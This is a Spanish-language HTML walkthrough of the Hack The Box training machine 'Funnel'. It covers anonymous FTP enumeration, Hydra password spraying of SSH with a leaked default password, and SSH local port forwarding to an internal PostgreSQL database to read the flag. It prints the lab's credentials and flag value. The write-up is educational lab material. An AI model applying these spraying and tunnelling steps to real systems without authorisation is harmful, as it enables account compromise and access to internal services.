@@ -1,0 +1,896 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Funnel — HTB Writeup</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Space+Grotesk:wght@400;600;700&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #0a0e17;
+    --surface: #111827;
+    --surface-alt: #0f1525;
+    --border: #1e293b;
+    --green: #22c55e;
+    --green-dim: #16a34a;
+    --green-glow: rgba(34, 197, 94, 0.15);
+    --red: #ef4444;
+    --red-dim: rgba(239, 68, 68, 0.12);
+    --blue: #3b82f6;
+    --blue-glow: rgba(59, 130, 246, 0.12);
+    --yellow: #eab308;
+    --yellow-glow: rgba(234, 179, 8, 0.12);
+    --purple: #a855f7;
+    --purple-glow: rgba(168, 85, 247, 0.12);
+    --orange: #f97316;
+    --orange-glow: rgba(249, 115, 22, 0.12);
+    --cyan: #06b6d4;
+    --text: #e2e8f0;
+    --text-dim: #94a3b8;
+    --text-muted: #64748b;
+    --font-mono: 'JetBrains Mono', monospace;
+    --font-sans: 'Space Grotesk', sans-serif;
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: var(--font-sans);
+    min-height: 100vh;
+    line-height: 1.7;
+  }
+
+  .container {
+    max-width: 900px;
+    margin: 0 auto;
+    padding: 40px 24px 80px;
+  }
+
+  /* ── HEADER ── */
+  .header {
+    text-align: center;
+    margin-bottom: 48px;
+    padding-bottom: 32px;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .header h1 {
+    font-size: 2.8rem;
+    font-weight: 700;
+    color: var(--green);
+    letter-spacing: -1px;
+    text-shadow: 0 0 40px var(--green-glow);
+    margin-bottom: 16px;
+  }
+
+  .header .machine-subtitle {
+    color: var(--text-dim);
+    font-size: 1rem;
+    margin-bottom: 20px;
+  }
+
+  .meta-tags {
+    display: flex;
+    justify-content: center;
+    gap: 10px;
+    flex-wrap: wrap;
+  }
+
+  .tag {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    padding: 5px 14px;
+    border-radius: 20px;
+    font-size: 0.75rem;
+    font-family: var(--font-mono);
+    font-weight: 600;
+  }
+
+  .tag.os { background: var(--blue-glow); border: 1px solid rgba(59,130,246,0.3); color: var(--blue); }
+  .tag.difficulty { background: var(--green-glow); border: 1px solid rgba(34,197,94,0.3); color: var(--green); }
+  .tag.skill { background: var(--purple-glow); border: 1px solid rgba(168,85,247,0.3); color: var(--purple); }
+  .tag.skill2 { background: var(--orange-glow); border: 1px solid rgba(249,115,22,0.3); color: var(--orange); }
+  .tag.skill3 { background: var(--yellow-glow); border: 1px solid rgba(234,179,8,0.3); color: var(--yellow); }
+
+  /* ── TABLE OF CONTENTS ── */
+  .toc {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 12px;
+    padding: 24px 28px;
+    margin-bottom: 40px;
+  }
+
+  .toc h3 {
+    font-size: 0.75rem;
+    text-transform: uppercase;
+    letter-spacing: 2px;
+    color: var(--text-muted);
+    margin-bottom: 14px;
+    font-family: var(--font-mono);
+  }
+
+  .toc ul {
+    list-style: none;
+    display: grid;
+    gap: 6px;
+  }
+
+  .toc a {
+    color: var(--text-dim);
+    text-decoration: none;
+    font-size: 0.88rem;
+    padding: 4px 0;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    transition: color 0.2s;
+  }
+
+  .toc a:hover { color: var(--green); }
+
+  .toc a .toc-num {
+    font-family: var(--font-mono);
+    font-size: 0.7rem;
+    color: var(--text-muted);
+    min-width: 24px;
+  }
+
+  /* ── SECTIONS ── */
+  .section {
+    margin-bottom: 48px;
+  }
+
+  .section-header {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    margin-bottom: 20px;
+    padding-bottom: 12px;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .section-icon {
+    font-size: 1.4rem;
+  }
+
+  .section-header h2 {
+    font-size: 1.4rem;
+    font-weight: 700;
+    letter-spacing: -0.3px;
+  }
+
+  .section p {
+    color: var(--text-dim);
+    font-size: 0.92rem;
+    margin-bottom: 14px;
+    line-height: 1.8;
+  }
+
+  .section p strong {
+    color: var(--text);
+  }
+
+  /* ── CODE BLOCKS ── */
+  .code-block {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    margin: 16px 0;
+    overflow: hidden;
+  }
+
+  .code-header {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 8px 16px;
+    background: var(--surface-alt);
+    border-bottom: 1px solid var(--border);
+  }
+
+  .code-lang {
+    font-family: var(--font-mono);
+    font-size: 0.65rem;
+    color: var(--text-muted);
+    text-transform: uppercase;
+    letter-spacing: 1.5px;
+  }
+
+  .code-dots {
+    display: flex;
+    gap: 6px;
+  }
+
+  .code-dots span {
+    width: 10px;
+    height: 10px;
+    border-radius: 50%;
+  }
+
+  .code-dots span:nth-child(1) { background: #ef4444; }
+  .code-dots span:nth-child(2) { background: #eab308; }
+  .code-dots span:nth-child(3) { background: #22c55e; }
+
+  .code-block pre {
+    padding: 16px 20px;
+    overflow-x: auto;
+    font-family: var(--font-mono);
+    font-size: 0.78rem;
+    line-height: 1.7;
+    color: var(--text-dim);
+  }
+
+  .code-block pre .cmd { color: var(--green); }
+  .code-block pre .flag { color: var(--yellow); }
+  .code-block pre .output { color: var(--text-muted); }
+  .code-block pre .important { color: var(--red); }
+  .code-block pre .highlight { color: var(--cyan); background: rgba(6, 182, 212, 0.08); padding: 1px 4px; border-radius: 3px; }
+  .code-block pre .comment { color: var(--text-muted); font-style: italic; }
+  .code-block pre .user { color: var(--purple); }
+  .code-block pre .string { color: var(--orange); }
+
+  /* ── INFO BOXES ── */
+  .info-box {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 12px;
+    padding: 18px 22px;
+    margin: 16px 0;
+    display: flex;
+    gap: 14px;
+    align-items: flex-start;
+  }
+
+  .info-box .info-icon {
+    font-size: 1.2rem;
+    flex-shrink: 0;
+    margin-top: 2px;
+  }
+
+  .info-box p {
+    margin: 0;
+    font-size: 0.85rem;
+    color: var(--text-dim);
+  }
+
+  .info-box.tip { border-left: 3px solid var(--green); }
+  .info-box.warning { border-left: 3px solid var(--yellow); }
+  .info-box.danger { border-left: 3px solid var(--red); }
+  .info-box.note { border-left: 3px solid var(--blue); }
+
+  /* ── CREDENTIALS TABLE ── */
+  .creds-table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 16px 0;
+    font-size: 0.85rem;
+  }
+
+  .creds-table th {
+    text-align: left;
+    padding: 10px 16px;
+    background: var(--surface-alt);
+    border: 1px solid var(--border);
+    font-family: var(--font-mono);
+    font-size: 0.7rem;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    color: var(--text-muted);
+  }
+
+  .creds-table td {
+    padding: 10px 16px;
+    border: 1px solid var(--border);
+    background: var(--surface);
+    font-family: var(--font-mono);
+    font-size: 0.8rem;
+    color: var(--text-dim);
+  }
+
+  /* ── DIAGRAM INLINE ── */
+  .tunnel-diagram-inline {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 12px;
+    padding: 28px 20px;
+    margin: 20px 0;
+    text-align: center;
+    position: relative;
+    overflow: hidden;
+  }
+
+  .tunnel-diagram-inline::before {
+    content: '';
+    position: absolute;
+    inset: 0;
+    background: 
+      radial-gradient(ellipse at 20% 50%, var(--blue-glow) 0%, transparent 50%),
+      radial-gradient(ellipse at 80% 50%, var(--yellow-glow) 0%, transparent 50%);
+    pointer-events: none;
+  }
+
+  .tunnel-flow {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+    flex-wrap: wrap;
+    position: relative;
+    z-index: 1;
+    font-family: var(--font-mono);
+    font-size: 0.8rem;
+  }
+
+  .flow-item {
+    padding: 8px 14px;
+    border-radius: 8px;
+    font-weight: 600;
+  }
+
+  .flow-item.you { background: var(--blue-glow); border: 1px solid rgba(59,130,246,0.3); color: var(--blue); }
+  .flow-item.tunnel { background: var(--green-glow); border: 1px solid rgba(34,197,94,0.3); color: var(--green); }
+  .flow-item.target { background: var(--yellow-glow); border: 1px solid rgba(234,179,8,0.3); color: var(--yellow); }
+  .flow-item.db { background: var(--purple-glow); border: 1px solid rgba(168,85,247,0.3); color: var(--purple); }
+
+  .flow-arrow {
+    color: var(--text-muted);
+    font-size: 1.2rem;
+  }
+
+  /* ── USERS LIST ── */
+  .users-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(140px, 1fr));
+    gap: 8px;
+    margin: 14px 0;
+  }
+
+  .user-chip {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 8px 12px;
+    font-family: var(--font-mono);
+    font-size: 0.78rem;
+    color: var(--text-dim);
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+
+  .user-chip.valid {
+    border-color: rgba(34, 197, 94, 0.3);
+    color: var(--green);
+  }
+
+  .user-chip .dot {
+    width: 6px;
+    height: 6px;
+    border-radius: 50%;
+    background: var(--text-muted);
+  }
+
+  .user-chip.valid .dot { background: var(--green); }
+
+  /* ── SS OUTPUT TABLE ── */
+  .ports-grid {
+    display: grid;
+    gap: 8px;
+    margin: 14px 0;
+  }
+
+  .port-row {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 10px 16px;
+    font-family: var(--font-mono);
+    font-size: 0.78rem;
+  }
+
+  .port-num {
+    font-weight: 700;
+    min-width: 50px;
+  }
+
+  .port-service { color: var(--text-dim); flex: 1; }
+
+  .port-access {
+    padding: 3px 10px;
+    border-radius: 12px;
+    font-size: 0.65rem;
+    font-weight: 600;
+  }
+
+  .port-access.external { background: var(--green-glow); color: var(--green); border: 1px solid rgba(34,197,94,0.2); }
+  .port-access.local { background: var(--red-dim); color: var(--red); border: 1px solid rgba(239,68,68,0.2); }
+
+  /* ── FLAG ── */
+  .flag-box {
+    background: var(--surface);
+    border: 2px solid var(--green);
+    border-radius: 12px;
+    padding: 24px;
+    text-align: center;
+    margin: 24px 0;
+    box-shadow: 0 0 40px var(--green-glow);
+    position: relative;
+    overflow: hidden;
+  }
+
+  .flag-box::before {
+    content: '';
+    position: absolute;
+    inset: 0;
+    background: radial-gradient(ellipse at center, var(--green-glow) 0%, transparent 70%);
+    pointer-events: none;
+  }
+
+  .flag-box .flag-label {
+    font-family: var(--font-mono);
+    font-size: 0.7rem;
+    text-transform: uppercase;
+    letter-spacing: 3px;
+    color: var(--green-dim);
+    margin-bottom: 10px;
+    position: relative;
+  }
+
+  .flag-box .flag-value {
+    font-family: var(--font-mono);
+    font-size: 1.1rem;
+    font-weight: 700;
+    color: var(--green);
+    position: relative;
+    word-break: break-all;
+  }
+
+  /* ── LESSONS ── */
+  .lessons-grid {
+    display: grid;
+    gap: 12px;
+    margin-top: 16px;
+  }
+
+  .lesson {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 16px 20px;
+    display: flex;
+    gap: 14px;
+    align-items: flex-start;
+  }
+
+  .lesson-num {
+    flex-shrink: 0;
+    width: 28px;
+    height: 28px;
+    border-radius: 50%;
+    background: var(--green-glow);
+    border: 1px solid rgba(34, 197, 94, 0.3);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-family: var(--font-mono);
+    font-size: 0.7rem;
+    font-weight: 700;
+    color: var(--green);
+  }
+
+  .lesson p {
+    margin: 0;
+    font-size: 0.85rem;
+    color: var(--text-dim);
+    line-height: 1.6;
+  }
+
+  .lesson p strong { color: var(--text); }
+
+  /* ── FOOTER ── */
+  .footer {
+    margin-top: 60px;
+    padding-top: 24px;
+    border-top: 1px solid var(--border);
+    text-align: center;
+    font-family: var(--font-mono);
+    font-size: 0.7rem;
+    color: var(--text-muted);
+  }
+
+  @media (max-width: 600px) {
+    .header h1 { font-size: 2rem; }
+    .tunnel-flow { flex-direction: column; }
+    .flow-arrow { transform: rotate(90deg); }
+    .users-grid { grid-template-columns: 1fr 1fr; }
+  }
+</style>
+</head>
+<body>
+<div class="container">
+
+  <!-- ═══════════ HEADER ═══════════ -->
+  <div class="header">
+    <h1>Funnel</h1>
+    <p class="machine-subtitle">Hack The Box — Starting Point</p>
+    <div class="meta-tags">
+      <span class="tag os">🐧 Linux</span>
+      <span class="tag difficulty">Very Easy</span>
+      <span class="tag skill">FTP Enumeration</span>
+      <span class="tag skill2">Password Spraying</span>
+      <span class="tag skill3">SSH Tunneling</span>
+    </div>
+  </div>
+
+  <!-- ═══════════ TABLE OF CONTENTS ═══════════ -->
+  <div class="toc">
+    <h3>Índice</h3>
+    <ul>
+      <li><a href="#recon"><span class="toc-num">01</span> Reconocimiento / Enumeración</a></li>
+      <li><a href="#ftp"><span class="toc-num">02</span> Enumeración FTP</a></li>
+      <li><a href="#foothold"><span class="toc-num">03</span> Foothold — Password Spraying + SSH</a></li>
+      <li><a href="#internal"><span class="toc-num">04</span> Enumeración Interna</a></li>
+      <li><a href="#tunneling"><span class="toc-num">05</span> Tunneling — Local Port Forwarding</a></li>
+      <li><a href="#flag"><span class="toc-num">06</span> Captura de la Flag</a></li>
+      <li><a href="#lessons"><span class="toc-num">07</span> Lecciones Aprendidas</a></li>
+    </ul>
+  </div>
+
+  <!-- ═══════════ 1. RECONOCIMIENTO ═══════════ -->
+  <div class="section" id="recon">
+    <div class="section-header">
+      <span class="section-icon">🔍</span>
+      <h2>1. Reconocimiento / Enumeración</h2>
+    </div>
+
+    <p>Empezamos con un escaneo de puertos con <strong>nmap</strong>, usando scripts por defecto (<code>-sC</code>) y detección de versiones (<code>-sV</code>).</p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <div class="code-dots"><span></span><span></span><span></span></div>
+        <span class="code-lang">bash</span>
+      </div>
+      <pre><span class="cmd">sudo nmap -sC -sV</span> <span class="flag">{target_IP}</span></pre>
+    </div>
+
+    <p>El escaneo revela <strong>solo 2 puertos abiertos</strong>:</p>
+
+    <div class="ports-grid">
+      <div class="port-row">
+        <span class="port-num" style="color: var(--green);">21</span>
+        <span class="port-service">vsftpd 3.0.3 (FTP)</span>
+        <span class="port-access external">Externo</span>
+      </div>
+      <div class="port-row">
+        <span class="port-num" style="color: var(--green);">22</span>
+        <span class="port-service">OpenSSH 8.2p1 (SSH)</span>
+        <span class="port-access external">Externo</span>
+      </div>
+    </div>
+
+    <div class="info-box tip">
+      <span class="info-icon">💡</span>
+      <p>Nmap detecta que el FTP permite <strong>login anónimo</strong>: <code>ftp-anon: Anonymous FTP login allowed (FTP code 230)</code>. Esto es nuestro punto de entrada.</p>
+    </div>
+  </div>
+
+  <!-- ═══════════ 2. FTP ═══════════ -->
+  <div class="section" id="ftp">
+    <div class="section-header">
+      <span class="section-icon">📂</span>
+      <h2>2. Enumeración FTP</h2>
+    </div>
+
+    <p>Nos conectamos al servicio FTP como usuario <strong>anonymous</strong> (sin contraseña).</p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <div class="code-dots"><span></span><span></span><span></span></div>
+        <span class="code-lang">bash</span>
+      </div>
+      <pre><span class="cmd">ftp</span> <span class="flag">{target_IP}</span>
+<span class="output">Name: </span><span class="highlight">anonymous</span>
+<span class="output">230 Login successful.</span>
+
+<span class="cmd">cd</span> mail_backup
+<span class="cmd">dir</span>
+<span class="output">-rw-r--r--  1 ftp  ftp  58899 Nov 28 14:30 </span><span class="highlight">password_policy.pdf</span>
+<span class="output">-rw-r--r--  1 ftp  ftp    713 Nov 28 14:31 </span><span class="highlight">welcome_28112022</span>
+
+<span class="cmd">get</span> password_policy.pdf
+<span class="cmd">get</span> welcome_28112022
+<span class="cmd">exit</span></pre>
+    </div>
+
+    <p>El archivo <strong>welcome_28112022</strong> es un email dirigido a varios empleados. De ahí extraemos los nombres de usuario:</p>
+
+    <div class="users-grid">
+      <div class="user-chip"><span class="dot"></span>optimus</div>
+      <div class="user-chip"><span class="dot"></span>albert</div>
+      <div class="user-chip"><span class="dot"></span>andreas</div>
+      <div class="user-chip valid"><span class="dot"></span>christine ✓</div>
+      <div class="user-chip"><span class="dot"></span>maria</div>
+    </div>
+
+    <p>El archivo <strong>password_policy.pdf</strong> es un memo de política de contraseñas que irónicamente revela la contraseña por defecto:</p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <div class="code-dots"><span></span><span></span><span></span></div>
+        <span class="code-lang">credenciales</span>
+      </div>
+      <pre><span class="comment"># Contraseña default expuesta en el PDF</span>
+<span class="important">funnel123#!#</span></pre>
+    </div>
+
+    <div class="info-box warning">
+      <span class="info-icon">⚠️</span>
+      <p>El PDF dice que la contraseña por defecto <strong>debe cambiarse inmediatamente</strong>. Apostamos a que algún usuario no lo hizo.</p>
+    </div>
+  </div>
+
+  <!-- ═══════════ 3. FOOTHOLD ═══════════ -->
+  <div class="section" id="foothold">
+    <div class="section-header">
+      <span class="section-icon">🎯</span>
+      <h2>3. Foothold — Password Spraying + SSH</h2>
+    </div>
+
+    <p>Con la lista de usuarios y la contraseña default, hacemos un ataque de <strong>password spraying</strong> con <strong>Hydra</strong> contra el servicio SSH.</p>
+
+    <p>Primero creamos el archivo de usuarios:</p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <div class="code-dots"><span></span><span></span><span></span></div>
+        <span class="code-lang">bash</span>
+      </div>
+      <pre><span class="cmd">echo -e</span> <span class="string">"optimus\nalbert\nandreas\nchristine\nmaria"</span> <span class="cmd">></span> usernames.txt</pre>
+    </div>
+
+    <p>Lanzamos Hydra:</p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <div class="code-dots"><span></span><span></span><span></span></div>
+        <span class="code-lang">bash</span>
+      </div>
+      <pre><span class="cmd">hydra</span> <span class="flag">-L</span> usernames.txt <span class="flag">-p</span> <span class="string">'funnel123#!#'</span> <span class="flag">{target_IP}</span> ssh
+
+<span class="output">[DATA] attacking ssh://10.129.228.195:22/</span>
+<span class="highlight">[22][ssh] host: 10.129.228.195   login: christine   password: funnel123#!#</span>
+<span class="output">1 of 1 target successfully completed, 1 valid password found</span></pre>
+    </div>
+
+    <div class="info-box tip">
+      <span class="info-icon">✅</span>
+      <p><strong>christine</strong> no cambió la contraseña por defecto. Password spraying es especialmente útil porque evita bloqueos de cuenta: probamos la misma contraseña contra todos los usuarios.</p>
+    </div>
+
+    <p>Nos conectamos por SSH:</p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <div class="code-dots"><span></span><span></span><span></span></div>
+        <span class="code-lang">bash</span>
+      </div>
+      <pre><span class="cmd">ssh</span> <span class="user">christine</span>@<span class="flag">{target_IP}</span>
+<span class="output">Password:</span> <span class="string">funnel123#!#</span>
+
+<span class="output">christine@funnel:~$</span> <span class="cmd">id</span>
+<span class="output">uid=1000(christine) gid=1000(christine) groups=1000(christine)</span></pre>
+    </div>
+
+    <table class="creds-table">
+      <tr><th>Servicio</th><th>Usuario</th><th>Contraseña</th></tr>
+      <tr><td>FTP</td><td>anonymous</td><td>(vacía)</td></tr>
+      <tr><td>SSH</td><td>christine</td><td>funnel123#!#</td></tr>
+      <tr><td>PostgreSQL</td><td>christine</td><td>funnel123#!#</td></tr>
+    </table>
+  </div>
+
+  <!-- ═══════════ 4. ENUMERACIÓN INTERNA ═══════════ -->
+  <div class="section" id="internal">
+    <div class="section-header">
+      <span class="section-icon">🔎</span>
+      <h2>4. Enumeración Interna</h2>
+    </div>
+
+    <p>Ya dentro de la máquina, usamos <code>ss -tln</code> para ver qué puertos están escuchando localmente:</p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <div class="code-dots"><span></span><span></span><span></span></div>
+        <span class="code-lang">bash</span>
+      </div>
+      <pre><span class="cmd">ss -tln</span>
+
+<span class="output">State   Recv-Q  Send-Q  Local Address:Port   Peer Address:Port</span>
+<span class="output">LISTEN  0       4096    127.0.0.53%lo:53     0.0.0.0:*</span>
+<span class="output">LISTEN  0       128     0.0.0.0:22           0.0.0.0:*</span>
+<span class="important">LISTEN  0       4096    127.0.0.1:5432       0.0.0.0:*</span>
+<span class="output">LISTEN  0       4096    127.0.0.1:36137      0.0.0.0:*</span>
+<span class="output">LISTEN  0       32      *:21                 *:*</span>
+<span class="output">LISTEN  0       128     [::]:22              [::]:*</span></pre>
+    </div>
+
+    <p>Descubrimos puertos internos que no eran visibles desde fuera:</p>
+
+    <div class="ports-grid">
+      <div class="port-row">
+        <span class="port-num" style="color: var(--green);">21</span>
+        <span class="port-service">FTP (vsftpd)</span>
+        <span class="port-access external">Externo</span>
+      </div>
+      <div class="port-row">
+        <span class="port-num" style="color: var(--green);">22</span>
+        <span class="port-service">SSH (OpenSSH)</span>
+        <span class="port-access external">Externo</span>
+      </div>
+      <div class="port-row">
+        <span class="port-num" style="color: var(--red);">5432</span>
+        <span class="port-service">PostgreSQL</span>
+        <span class="port-access local">Solo Local</span>
+      </div>
+    </div>
+
+    <div class="info-box danger">
+      <span class="info-icon">🚫</span>
+      <p>PostgreSQL escucha en <code>127.0.0.1:5432</code> — <strong>solo acepta conexiones locales</strong>. No podemos acceder directamente desde nuestra máquina. Además, <code>psql</code> no está instalado en el target.</p>
+    </div>
+  </div>
+
+  <!-- ═══════════ 5. TUNNELING ═══════════ -->
+  <div class="section" id="tunneling">
+    <div class="section-header">
+      <span class="section-icon">🔒</span>
+      <h2>5. Tunneling — Local Port Forwarding</h2>
+    </div>
+
+    <p>El problema: necesitamos acceder a PostgreSQL (puerto 5432) que solo escucha localmente en el target, y no tenemos <code>psql</code> instalado allí. La solución es crear un <strong>túnel SSH con local port forwarding</strong>.</p>
+
+    <div class="info-box note">
+      <span class="info-icon">📘</span>
+      <p><strong>Local Port Forwarding:</strong> Abre un puerto en tu máquina local que redirige el tráfico a través del túnel SSH hacia un puerto del servidor remoto. Sintaxis: <code>ssh -L [local]:[host]:[remoto] user@target</code></p>
+    </div>
+
+    <div class="code-block">
+      <div class="code-header">
+        <div class="code-dots"><span></span><span></span><span></span></div>
+        <span class="code-lang">bash — Terminal 1: Crear el túnel</span>
+      </div>
+      <pre><span class="cmd">ssh</span> <span class="flag">-L</span> <span class="highlight">1234</span>:localhost:<span class="highlight">5432</span> <span class="user">christine</span>@<span class="flag">{target_IP}</span>
+<span class="comment"># Tu puerto 1234 → túnel SSH → puerto 5432 del target</span></pre>
+    </div>
+
+    <p>El flujo del tráfico es el siguiente:</p>
+
+    <div class="tunnel-diagram-inline">
+      <div class="tunnel-flow">
+        <div class="flow-item you">🐧 Tu :1234</div>
+        <span class="flow-arrow">→</span>
+        <div class="flow-item tunnel">🔒 SSH Tunnel</div>
+        <span class="flow-arrow">→</span>
+        <div class="flow-item target">🖥️ Target :22</div>
+        <span class="flow-arrow">→</span>
+        <div class="flow-item db">🗄️ PostgreSQL :5432</div>
+      </div>
+    </div>
+
+    <p>Ahora, en <strong>otra terminal</strong>, instalamos <code>psql</code> y nos conectamos al túnel:</p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <div class="code-dots"><span></span><span></span><span></span></div>
+        <span class="code-lang">bash — Terminal 2: Conectar a PostgreSQL</span>
+      </div>
+      <pre><span class="comment"># Instalar el cliente de PostgreSQL</span>
+<span class="cmd">sudo apt update && sudo apt install</span> postgresql-client
+
+<span class="comment"># Conectar a través del túnel</span>
+<span class="cmd">psql</span> <span class="flag">-U</span> christine <span class="flag">-h</span> localhost <span class="flag">-p</span> <span class="highlight">1234</span>
+<span class="output">Password:</span> <span class="string">funnel123#!#</span>
+
+<span class="output">psql (15.0 (Debian 15.0-2), server 15.1 (Debian 15.1-1.pgdg110+1))</span>
+<span class="output">christine=#</span></pre>
+    </div>
+
+    <div class="info-box tip">
+      <span class="info-icon">💡</span>
+      <p>Nos conectamos a <code>localhost:1234</code> (nuestro puerto local), pero SSH reenvía todo al <code>5432</code> del target. PostgreSQL cree que es una conexión local — no sabe que venimos de fuera.</p>
+    </div>
+
+    <div class="info-box note">
+      <span class="info-icon">📎</span>
+      <p><strong>Alternativa:</strong> También se podría usar <strong>dynamic port forwarding</strong> con <code>ssh -D 1234</code> + <code>proxychains</code>. Es más flexible si necesitas acceder a varios puertos internos sin crear un túnel por cada uno.</p>
+    </div>
+  </div>
+
+  <!-- ═══════════ 6. FLAG ═══════════ -->
+  <div class="section" id="flag">
+    <div class="section-header">
+      <span class="section-icon">🏁</span>
+      <h2>6. Captura de la Flag</h2>
+    </div>
+
+    <p>Ya dentro de PostgreSQL, exploramos las bases de datos:</p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <div class="code-dots"><span></span><span></span><span></span></div>
+        <span class="code-lang">sql — PostgreSQL</span>
+      </div>
+      <pre><span class="comment">-- Listar bases de datos</span>
+<span class="cmd">\l</span>
+<span class="output">  Name      | Owner     | Encoding</span>
+<span class="output">  christine | christine | UTF8</span>
+<span class="output">  postgres  | christine | UTF8</span>
+<span class="highlight">  secrets   | christine | UTF8</span>
+<span class="output">  template0 | christine | UTF8</span>
+<span class="output">  template1 | christine | UTF8</span>
+
+<span class="comment">-- Conectar a la base de datos "secrets"</span>
+<span class="cmd">\c</span> <span class="highlight">secrets</span>
+<span class="output">You are now connected to database "secrets" as user "christine".</span>
+
+<span class="comment">-- Listar tablas</span>
+<span class="cmd">\dt</span>
+<span class="output">  Schema | Name | Type  | Owner</span>
+<span class="output">  public | flag | table | christine</span>
+
+<span class="comment">-- Leer la flag</span>
+<span class="cmd">SELECT * FROM flag;</span></pre>
+    </div>
+
+    <div class="flag-box">
+      <div class="flag-label">🏴 Flag Capturada</div>
+      <div class="flag-value">cf277664b1771217d7006acdea006db1</div>
+    </div>
+  </div>
+
+  <!-- ═══════════ 7. LECCIONES ═══════════ -->
+  <div class="section" id="lessons">
+    <div class="section-header">
+      <span class="section-icon">📚</span>
+      <h2>7. Lecciones Aprendidas</h2>
+    </div>
+
+    <div class="lessons-grid">
+      <div class="lesson">
+        <div class="lesson-num">1</div>
+        <p><strong>FTP anónimo</strong> — Siempre verificar si el login anónimo está habilitado. Es una fuente común de información sensible (emails, documentos, credenciales).</p>
+      </div>
+      <div class="lesson">
+        <div class="lesson-num">2</div>
+        <p><strong>Contraseñas por defecto</strong> — Los usuarios no siempre cambian las credenciales default. El password spraying es efectivo y evita bloqueos de cuenta al probar una sola contraseña contra muchos usuarios.</p>
+      </div>
+      <div class="lesson">
+        <div class="lesson-num">3</div>
+        <p><strong>Enumeración post-acceso</strong> — Siempre ejecutar <code>ss -tln</code> tras obtener acceso. Los servicios internos (como bases de datos) suelen esconder información crítica que no es visible desde fuera.</p>
+      </div>
+      <div class="lesson">
+        <div class="lesson-num">4</div>
+        <p><strong>SSH Local Port Forwarding</strong> — Permite acceder a servicios internos que solo escuchan en localhost. Es fundamental para pivotar dentro de redes: <code>ssh -L [local]:[host]:[remoto] user@target</code>.</p>
+      </div>
+      <div class="lesson">
+        <div class="lesson-num">5</div>
+        <p><strong>Dynamic Port Forwarding</strong> — Para acceder a múltiples puertos internos, <code>ssh -D</code> + <code>proxychains</code> es más flexible que crear un túnel local por cada servicio.</p>
+      </div>
+    </div>
+  </div>
+
+  <!-- ═══════════ FOOTER ═══════════ -->
+  <div class="footer">
+    HTB Funnel Writeup · Máquina completada
+  </div>
+
+</div>
+</body>
+</html>
